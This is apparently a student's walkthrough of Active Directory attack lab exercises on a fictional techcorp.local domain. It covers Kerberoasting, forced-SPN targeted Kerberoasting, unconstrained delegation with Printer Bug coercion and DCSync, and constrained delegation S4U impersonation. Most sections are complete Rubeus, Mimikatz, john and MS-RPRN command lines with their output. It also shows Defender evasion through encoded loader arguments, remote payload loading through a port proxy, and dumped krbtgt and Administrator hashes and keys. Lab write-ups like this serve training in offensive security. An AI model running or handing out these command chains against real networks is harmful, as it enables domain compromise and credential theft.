# Kerberos Attacks

## Kerberoasting Attack

### Lab: Hands-On #06

#### Tasks

- Using the Kerberoasting attack, get the clear-text password for an account in `us.techcorp.local` domain

#### Tools

- `InviShell`
- `ADModule` (alternative: `PowerView`)
- `ArgSplit`
- `NetLoader`
- `Rubeus` (alternative: `KerberosRequestorSecurityToken` + `Invoke-Mimi`)
- `john` (alternative: `tgsrepcrack`)

#### Solution

- Using the Kerberoasting attack, get the clear-text password for an account in `us.techcorp.local` domain

We first need to find out services running with user accounts as the services running with machine accounts have difficult passwords.

We can use PowerView's `Get-DomainUser –SPN` or ActiveDirectory module for discovering such services.

```
PS C:\AD\Tools> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

[SNIP]

DistinguishedName    : CN=serviceaccount,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : service
Name                 : serviceaccount
ObjectClass          : user
ObjectGUID           : 8a97f972-51b1-4647-8b73-628f5da8ca01
SamAccountName       : serviceaccount 👤
ServicePrincipalName : {USSvc/serviceaccount} 📌
SID                  : S-1-5-21-210670787-2521448726-163245708-1144
Surname              : account
UserPrincipalName    : serviceaccount

DistinguishedName    : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : app
Name                 : appsvc
ObjectClass          : user
ObjectGUID           : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c
SamAccountName       : appsvc 👤
ServicePrincipalName : {appsvc/us-jump.us.techcorp.local} 📌
SID                  : S-1-5-21-210670787-2521448726-163245708-4601
Surname              : svc
UserPrincipalName    : appsvc

PS C:\AD\Tools> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select -expand samaccountname

krbtgt
serviceaccount
appsvc
```

⚠️ **Note**: it is not necessary to have an actual service using `serviceaccount`.

For the DC, an account with SPN set is a service account.

**Rubeus and John the Ripper**

We can use Rubeus to get hashes for `serviceaccount`.
Note that we are using the `/rc4opsec` option that gets hashes only for the accounts that support RC4. This means that if 'This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes.

Note that Windows Defender would detect Rubeus execution even when used with Loader. To avoid that, let's pass encoded arguments to the Loader.

```
C:\AD\Tools>C:\AD\Tools\ArgSplit.bat

[!] Argument Limit: 180 characters
[+] Enter a string: kerberoast

[SNIP]
```

```
C:\AD\Tool> echo %Pwn%

kerberoast

C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

[SNIP]

[*] Action: Kerberoasting

[SNIP]

[*] Target User            : serviceaccount
[*] Target Domain          : us.techcorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://US-DC.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=serviceaccount)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\hashes.txt
```

We can now use John the Ripper to brute-force the hashes.

```
C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123 🔑     (?)

[SNIP]
```

**KerberosRequestorSecurityToken .NET class from PowerShell, Mimikatz and tgsrepcrack.py**

We can also use the `KerberosRequestorSecurityToken` .NET class from PowerShell to request a ticket.

Now, let's request a ticket for the `serviceaccount` user.

```
PS C:\AD\Tools> Add-Type -AssemblyName System.IdentityModel

PS C:\AD\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"

Id                   : uuid-49b73a9f-9e80-4f9c-acd3-69eaf4a8010e-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 4/24/2025 10:53:16 AM
ValidTo              : 4/24/2025 8:42:51 PM
ServicePrincipalName : USSvc/serviceaccount
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Let's check if we got the ticket.

```
PS C:\AD\Tools> klist

[SNIP]

#2>     Client: studentuser51 @ US.TECHCORP.LOCAL
        Server: USSvc/serviceaccount @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/24/2025 3:53:16 (local)
        End Time:   4/24/2025 13:42:51 (local)
        Renew Time: 5/1/2025 3:42:51 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: US-DC.us.techcorp.local

[SNIP]
```

Now, let's dump the tickets on disk.

```
PS C:\AD\Tools> Import-Module C:\AD\Tools\Invoke-Mimi.ps1

PS C:\AD\Tools> Invoke-Mimi -Command '"kerberos::list /export"'

[SNIP]

mimikatz(powershell) # kerberos::list /export

[SNIP]

[00000002] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 4/24/2025 3:53:16 AM ; 4/24/2025 1:42:51 PM ; 5/1/2025 3:42:51 AM
   Server Name       : USSvc/serviceaccount @ US.TECHCORP.LOCAL
   Client Name       : studentuser51 @ US.TECHCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 2-40a10000-studentuser51@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi 🎟️

[SNIP]
```

Let's brute-force the ticket now.

```
PS C:\AD\Tools\kerberoast> python.exe C:\AD\Tools\kerberoast\tgsrepcrack.py C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\2-60210000-studentuserx@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi

found password for ticket 0: Password123 🔑
File: C:\AD\Tools\2-60210000-studentuserx@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi
All tickets cracked!
```

---
---

## Targeted Kerberoasting Attack

### Lab: Hands-On #07

#### Tasks

- Determine if `studentuser51` has permissions to set UserAccountControl flags for any user
- If yes, force set a SPN on the user and obtain a TGS for the user

#### Tools

- `InviShell`
- `ADModule` (alternative: `PowerView`)
- `ArgSplit`
- `NetLoader`
- `Rubeus` (alternative: `KerberosRequestorSecurityToken` + `Invoke-Mimi`)
- `john` (alternative: `tgsrepcrack`)

#### Solution

- Determine if `studentuser51` has permissions to set UserAccountControl flags for any user

Recall from a previous hands-on (#03) that we also scan ACLs if any group of which `studentuser51` is a member has interesting permissions.

```
PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

ObjectDN                : CN=Support51User 👤,CN=Users,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll 🔐
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
IdentityReferenceName   : studentusers 👥
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=Support52User,CN=Users,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
IdentityReferenceName   : studentusers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

[SNIP]
```

Let's check if `support51user` already has a SPN.
We can do it with PowerView or ActiveDirectory module.

**AD Module**

```
PS C:\AD\Tools> Get-ADUser -Identity support51user -Properties ServicePrincipalName | select ServicePrincipalName

ServicePrincipalName
--------------------
{}
```

- If yes, force set a SPN on the user and obtain a TGS for the user

Since `studentuser51` has GenericAll rights on the `support51user`, let's force set a SPN on it.

**AD Module**

```
PS C:\AD\Tools> Set-ADUser -Identity support51user -ServicePrincipalNames @{Add='us/myspn51'} -Verbose

VERBOSE: Performing the operation "Set" on target "CN=Support51User,CN=Users,DC=us,DC=techcorp,DC=local".
```

**PowerView**

```
PS C:\AD\Tools> Set-DomainObject -Identity support51user -Set @{serviceprincipalname='us/myspn51'} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://US-DC.US.TECHCORP.LOCAL/DC=US,DC=TECHCORP,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=support51user)(name=support51user)(displayname=support51user))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'us/myspn51' for object 'Support51user'
```

Now, once again check the SPN for `support51user`.

```
PS C:\AD\Tools> Get-ADUser -Identity support51user -Properties ServicePrincipalName | select ServicePrincipalName

ServicePrincipalName
--------------------
{us/myspn51} 📌
```

Now, we can kerberoast the SPN.

```
C:\AD\Tools> C:\AD\Tools\ArgSplit.bat
[!] Argument Limit: 180 characters
[+] Enter a string: kerberoast

[SNIP]
```

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:support51user /simple /rc4opsec /outfile:C:\AD\Tools\targetedhashes.txt

[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : support51user
[*] Target Domain          : us.techcorp.local
[+] Ticket successfully imported!

[SNIP]

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\targetedhashes.txt

[*] Roasted hashes written to : C:\AD\Tools\targetedhashes.txt
```

Let's brute-force the ticket now.

```
C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Desk@123 🔑        (?)

[SNIP]
```

---
---

## Unconstrained Delegation & Printer Bug Abuse

### Lab: Hands-On #11

#### Tasks

- Find a server in `us.techcorp.local` domain where Unconstrained Delegation is enabled
- Compromise that server and get Domain Admin privileges

#### Tools

- `InviShell`
- `ADModule` (alternative: `PowerView`)
- `ArgSplit`
- `NetLoader`
- `Rubeus`
- `Find-PSRemotingLocalAdminAccess`
- `xcopy`
- `netsh`
- `Enter-PSSession`
- `MS-RPRN`
- `SafetyKatz` (alternative: `Invoke-Mimi`)

#### Solution

- Find a server in `us.techcorp.local` domain where Unconstrained Delegation is enabled

We can use PowerView or Active Directory module for that.

```
PS C:\AD\Tools> Get-ADComputer -Filter {TrustedForDelegation -eq $True}

DistinguishedName : CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=local
DNSHostName       : US-DC.us.techcorp.local
Enabled           : True
Name              : US-DC
ObjectClass       : computer
ObjectGUID        : 2edf59cf-aa6e-448a-9810-7a81a3d3af16
SamAccountName    : US-DC$
SID               : S-1-5-21-210670787-2521448726-163245708-1000
UserPrincipalName :

DistinguishedName : CN=US-WEB,CN=Computers,DC=us,DC=techcorp,DC=local
DNSHostName       : US-Web.us.techcorp.local 🖥️
Enabled           : True
Name              : US-WEB
ObjectClass       : computer
ObjectGUID        : cb00dc1e-3619-4187-a02b-42f9c964a637
SamAccountName    : US-WEB$
SID               : S-1-5-21-210670787-2521448726-163245708-1110
UserPrincipalName :
```

So, we need to compromise `us-web`.

- Compromise that server and get Domain Admin privileges

Recall that we got credentials of `webmaster` in the previous hands-on (#10).
Let's check if that user has administrative access to `us-web`.

We will use OverPass-The-Hash attack to use `webmaster`'s AES keys using SafetyKatz. You can use other tools of your choice.

```
C:\Users\studentuser51> C:\AD\Tools\ArgSplit.bat

[!] Argument Limit: 180 characters
[+] Enter a string: asktgt

[SNIP]
```

Run the below from an elevated shell.

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

[SNIP]

[*] Action: Ask TGT

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  webmaster
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  4/24/2025 8:59:25 AM
  EndTime                  :  4/24/2025 6:59:25 PM
  RenewTill                :  5/1/2025 8:59:25 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  0tCj7v4qXPE0Rp2AioPpK2dV7iZoa0Kyy/vMe3N1vbo=
  ASREP (key)              :  2A653F166761226EB2E939218F5A34D3D2AF005A91F160540DA6E4A5E29DE8A0
```

In the newly spawned process, use `Find-PSRemotingLocalAdminAccess` after loading InvisiShell.

```
PS C:\AD\Tools> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose

US-Web 🖥️
```

We have administrative access to `us-web` using `webmaster`'s credentials.

Now, we will use the Printer Bug to force `us-dc` to connect to `us-web`.

Let's first copy the Loader to `us-web` to download and execute Rubeus in the memory and start monitoring for any authentication from `us-dc`.
We can use multiple methods to copy Rubeus like xcopy, PowerShell Remoting, etc.

**Copy `Loader.exe` using xcopy and execute using winrs**

From the process running as `webmaster`.

```
PS C:\AD\Tools> echo F | xcopy C:\AD\Tools\Loader.exe \\us-web\C$\Users\Public\Loader.exe /Y

[SNIP]
```

```
PS C:\AD\Tools> winrs -r:us-web cmd.exe

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>
🚀
```

```
C:\Users\webmaster> echo %Pwn%

monitor

C:\Users\webmaster> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.51

C:\Users\webmaster> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:US-DC$ /interval:5 /nowrap

[SNIP]

[*] Action: TGT Monitoring
[*] Target user     : US-DC$
[*] Monitoring every 5 seconds for new TGTs

[SNIP]
```

**Copy and execute Rubeus using PowerShell Remoting**

From the process running as `webmaster`.

```
PS C:\AD\Tools> $usweb1 = New-PSSession us-web

PS C:\AD\Tools> Copy-Item -ToSession $usweb1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\Public

PS C:\AD\Tools> Enter-PSSession $usweb1

[us-web]: PS C:\Users\webmaster\Documents>
🚀

[us-web]: PS C:\Users\webmaster\Documents> C:\Users\Public\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap

[SNIP]

[*] Action: TGT Monitoring
[*] Target user     : US-DC$
[*] Monitoring every 5 seconds for new TGTs

[SNIP]
```

Using either of the above methods, once we have Rubeus running in the monitor mode, we can start `MS-RPRN.exe` to force connect `us-dc` to `us-web` and thereby abuse the Printer Bug.

```
PS C:\Users\studentuser51> C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local

Attempted printer notification and received an invalid handle.
The coerced authentication probably worked! 🔥
```

On the session where Rubeus is running, we can see:

```
[SNIP]

[*] 4/24/2025 4:08:34 PM UTC - Found new TGT:

  User                  :  US-DC$@US.TECHCORP.LOCAL
  StartTime             :  4/24/2025 4:02:35 AM
  EndTime               :  4/24/2025 2:02:22 PM
  RenewTill             :  5/1/2025 4:02:22 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMqTU4YeamAucrsQFdQ7OqmahNm31cuhJP0vaky+iaBNufUxJ6aMA6yY0hHY/lZupDRcMriZElAeJ1kix6W328qS8Ah3JjBUnhJFuaSV/6W3T8jjiG0tR+IHBuUf1q8wtlctiMjt9nVB0YiE8YrrekDLMsFJDuUzGfvIPH4GtUNDAWhjUa1M5mTTBzBk/FlgheQBF62ZW8sm3BRGxQYrlTvLL0UtKbpgwnIXDTOqsJQSWCrDb+hVV6hwCLmznyw+EDjF9lO6OjzKzGasw5MhTTOo+V3y6AxP+atNgYcWXrlnh+gSLON1XKyHsv6wNxhwLYcDGUc00nCWRdnxTvnzGolekliNZF1I/NuuuX3oySPFSBz5G1/To07RCrw0CAC92m+TQWO3aY9dRch9ezRivE178f18yk8he7tGUYJ7h88lxWkPQmYnTChrPBuXrv9o1/TSXz9R8CL6GdJkv5okol95A0VD2UKJZ87KN1yphhLCli9ih3Mtc+QXzg6j9GXRaUcM9OPgNATnuDVX+wfu/Tg3OPa3rnLgdyXtE1TBbUtivLLPnKTdGx8n3gDHA20jXVeH64zut0hFCXd2aZ9l7lAhIkL7vxqVjbP2LXre8s8nHJ84I0XVNtlZe2foWcBVL5C7QbZM4vLVlS0jOkEgMGcF00JKPhh67OIzDw4+hpHdH/MOtq9mb/lVABML7GIu4ov9Cp8Np3r8OgZYiyI35iic8kKagbqmweRUaAGtDMR+CmeYb1y/ZMTgRmtYIAhIkUZ03xiyD5g1gHZGTuaPRmY4BwJONXg7CrIkS0q5G7+i3V4xcKS5GfIzorRfan9aU3vyDiju3M01ufTXlyDIDoe2LjwI5wq58gNH/70ontwSCar9LspfzwItd9dBITkcEc1cGNlSwLJhIZlRMGMwHPK+jecr13k2uL29keDhTRwchMWMUzlmx5i/EQhDmww5EXcf8zgzTvLEd0/0Pe3MzEBhOli0hY7K2ie6AX1Fz42vhIuS8p9FZIKOm+ikqd/eUws+fZ+70PBleE/ZTY0x2DrDbDqz4Pue1lsTSxSOO0ImbvqVA9+L9dI2Xgj/SFx8smxLOzHfr8OG88qRul2bsQyF/rejN0HUdQcMpryrR69z2nLUbn4JrlDFdVO0E41mBBNCpNt9bH/GhXnQ1p6aBTNEpSFi+9O3x5Y84nnNa4ZGR7UxOuEX9B7UtmaAL7/WRpcpHHsipLUtAycOE+F9HdbkHgWnXQ7HCR0IHgCuJQ3U3eyvMluo8lrSDixB/JoMwtE+IOkMwowPS60fBOZmPUGYnrhM4lQUw+e8FiSRabIscCORRHHf13bV8msBrvtJmifOy5EDWfy0btrb+Dq1BIypHm3w665KYHUskzW46A4LKV15eikninMQkmZqxcrpIvqA7cp7jZkkwGT+cRmzOlPH5cB4+2AKpBOianZ/IhxGTUZ7NnvEEEuAJxQBKjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCCA1MbotDAtN35rGWanztYfV++Kpo+1WBsqwozTAsmjWKETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDI1MDQyNDExMDIzNVqmERgPMjAyNTA0MjQyMTAyMjJapxEYDzIwMjUwNTAxMTEwMjIyWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
```

Copy the Base64EncodedTicket, remove unnecessary spaces and newline (if any) and use the ticket with Rubes on the Student VM.

```
C:\Windows\system32> echo %Pwn%

ptt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMqTU4YeamAucrsQFdQ7OqmahNm31cuhJP0vaky+iaBNufUxJ6aMA6yY0hHY/lZupDRcMriZElAeJ1kix6W328qS8Ah3JjBUnhJFuaSV/6W3T8jjiG0tR+IHBuUf1q8wtlctiMjt9nVB0YiE8YrrekDLMsFJDuUzGfvIPH4GtUNDAWhjUa1M5mTTBzBk/FlgheQBF62ZW8sm3BRGxQYrlTvLL0UtKbpgwnIXDTOqsJQSWCrDb+hVV6hwCLmznyw+EDjF9lO6OjzKzGasw5MhTTOo+V3y6AxP+atNgYcWXrlnh+gSLON1XKyHsv6wNxhwLYcDGUc00nCWRdnxTvnzGolekliNZF1I/NuuuX3oySPFSBz5G1/To07RCrw0CAC92m+TQWO3aY9dRch9ezRivE178f18yk8he7tGUYJ7h88lxWkPQmYnTChrPBuXrv9o1/TSXz9R8CL6GdJkv5okol95A0VD2UKJZ87KN1yphhLCli9ih3Mtc+QXzg6j9GXRaUcM9OPgNATnuDVX+wfu/Tg3OPa3rnLgdyXtE1TBbUtivLLPnKTdGx8n3gDHA20jXVeH64zut0hFCXd2aZ9l7lAhIkL7vxqVjbP2LXre8s8nHJ84I0XVNtlZe2foWcBVL5C7QbZM4vLVlS0jOkEgMGcF00JKPhh67OIzDw4+hpHdH/MOtq9mb/lVABML7GIu4ov9Cp8Np3r8OgZYiyI35iic8kKagbqmweRUaAGtDMR+CmeYb1y/ZMTgRmtYIAhIkUZ03xiyD5g1gHZGTuaPRmY4BwJONXg7CrIkS0q5G7+i3V4xcKS5GfIzorRfan9aU3vyDiju3M01ufTXlyDIDoe2LjwI5wq58gNH/70ontwSCar9LspfzwItd9dBITkcEc1cGNlSwLJhIZlRMGMwHPK+jecr13k2uL29keDhTRwchMWMUzlmx5i/EQhDmww5EXcf8zgzTvLEd0/0Pe3MzEBhOli0hY7K2ie6AX1Fz42vhIuS8p9FZIKOm+ikqd/eUws+fZ+70PBleE/ZTY0x2DrDbDqz4Pue1lsTSxSOO0ImbvqVA9+L9dI2Xgj/SFx8smxLOzHfr8OG88qRul2bsQyF/rejN0HUdQcMpryrR69z2nLUbn4JrlDFdVO0E41mBBNCpNt9bH/GhXnQ1p6aBTNEpSFi+9O3x5Y84nnNa4ZGR7UxOuEX9B7UtmaAL7/WRpcpHHsipLUtAycOE+F9HdbkHgWnXQ7HCR0IHgCuJQ3U3eyvMluo8lrSDixB/JoMwtE+IOkMwowPS60fBOZmPUGYnrhM4lQUw+e8FiSRabIscCORRHHf13bV8msBrvtJmifOy5EDWfy0btrb+Dq1BIypHm3w665KYHUskzW46A4LKV15eikninMQkmZqxcrpIvqA7cp7jZkkwGT+cRmzOlPH5cB4+2AKpBOianZ/IhxGTUZ7NnvEEEuAJxQBKjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCCA1MbotDAtN35rGWanztYfV++Kpo+1WBsqwozTAsmjWKETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDI1MDQyNDExMDIzNVqmERgPMjAyNTA0MjQyMTAyMjJapxEYDzIwMjUwNTAxMTEwMjIyWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

```
C:\Windows\system32> klist

Current LogonId is 0:0xcfb22c3

Cached Tickets: (1) 🎟️

#0>     Client: US-DC$ @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 4/24/2025 4:02:35 (local)
        End Time:   4/24/2025 14:02:22 (local)
        Renew Time: 5/1/2025 4:02:22 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

We can now run DCSync attack against `us-dc` using the injected ticket.

```
C:\Windows\system32> echo %Pwn%

lsadump::dcsync

C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit"

[SNIP]

mimikatz(commandline) # lsadump::dcsync /user:us\krbtgt

[SNIP]

SAM Username         : krbtgt 👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 7/5/2019 12:49:17 AM
Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: b0975ae49f441adc6b024ad238935af5 🔑

[SNIP]

* Primary:Kerberos-Newer-Keys *
    Default Salt : US.TECHCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 🔑
      aes128_hmac       (4096) : 1bae2a6639bb33bf720e2d50807bf2c1
      des_cbc_md5       (4096) : 923158b519f7a454

[SNIP]
```

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\administrator" "exit"

[SNIP]

mimikatz(commandline) # lsadump::dcsync /user:us\krbtgt

[SNIP]

SAM Username         : Administrator 👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 7/5/2019 12:42:09 AM
Object Security ID   : S-1-5-21-210670787-2521448726-163245708-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 43b70d2d979805f419e02882997f8f3f 🔑

[SNIP]

* Primary:Kerberos-Newer-Keys *
    Default Salt : US-DCAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 🔑
      aes128_hmac       (4096) : c9ae4aae409161db4cbb534f58457944
      des_cbc_md5       (4096) : 1c9be93e161643fd

[SNIP]
```

We can run the DCSync attack using Invoke-Mimi or any other tool too.

---
---

## Constrained Delegation Abuse

### Lab: Hands-On #12

#### Tasks

- Abuse Constrained delegation in `us.techcorp.local` to escalate privileges on a machine to Domain Admin

#### Tools

- `InviShell`
- `ADModule` (alternative: `PowerView`)
- `ArgSplit`
- `NetLoader`
- `Rubeus`
- `winrs` (alternative: `Enter-PSSession`)

#### Solution

- Abuse Constrained delegation in `us.techcorp.local` to escalate privileges on a machine to Domain Admin

Enumerate the objects in our current domain that have constrained delegation enabled.

```
PS C:\AD\Tools> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

DistinguishedName        : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
msDS-AllowedToDelegateTo : {CIFS/us-mssql.us.techcorp.local 🖥️, CIFS/us-mssql}
Name                     : appsvc 👤
ObjectClass              : user
ObjectGUID               : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c

DistinguishedName        : CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
msDS-AllowedToDelegateTo : {cifs/US-MSSQL.us.techcorp.local, cifs/US-MSSQL}
Name                     : US-MGMT
ObjectClass              : computer
ObjectGUID               : 6f7957b5-d229-4d00-8778-831aa4d9afac
```

Recall that on a previous hands-on (#10) we extracted credentials of `appsvc` from `us-jump`. Let's use the AES256 keys for `appsvc` to impersonate the domain administrator `us\Administrator` and access `us-mssql` using those privileges.

Note that we request an alternate ticket for HTTP service to be able to use WinRM.

```
C:\Users\studentuser51>echo %Pwn%

s4u

C:\Users\studentuser51>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt

[SNIP]

[*] Action: S4U

[SNIP]

[*] Impersonating user 'administrator' to target SPN 'CIFS/us-mssql.us.techcorp.local'
[*]   Final ticket will be for the alternate service 'HTTP'

[SNIP]

[+] Ticket successfully imported!
```

Check if the ticket is present in the current process.

```
C:\Users\studentuser51>klist

[SNIP]

Cached Tickets: (1)

#0>     Client: administrator @ US.TECHCORP.LOCAL
        Server: HTTP/us-mssql.us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/25/2025 3:10:30 (local)
        End Time:   4/25/2025 13:10:30 (local)
        Renew Time: 5/2/2025 3:10:30 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
